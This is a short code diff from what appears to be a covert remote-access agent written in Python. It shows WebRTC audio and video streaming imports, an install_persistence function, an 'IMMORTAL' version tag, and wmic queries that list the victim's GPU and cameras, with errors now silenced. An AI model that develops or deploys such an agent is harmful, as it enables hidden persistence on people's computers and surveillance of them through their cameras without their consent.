@@ -23,7 +23,7 @@ import numpy
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.2.0-IMMORTAL"
+AGENT_VERSION = "9.2.1-FIXED"
 
 def install_persistence():
     current_exe = sys.executable
@@ -154,12 +154,12 @@ def get_detailed_specs():
     try:
         gpu = "Unknown"
         try:
-            output = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode()
+            output = subprocess.check_output("wmic path win32_VideoController get name 2>NUL", shell=True).decode()
             gpu = output.split('\n')[1].strip()
         except: pass
         
         try:
-            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name', shell=True).decode()
+            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name 2>NUL', shell=True).decode()
             cams = [n.strip() for n in cam_output.split('\n') if n.strip() and n.strip().lower() != "name"]
         except:
             cams = []
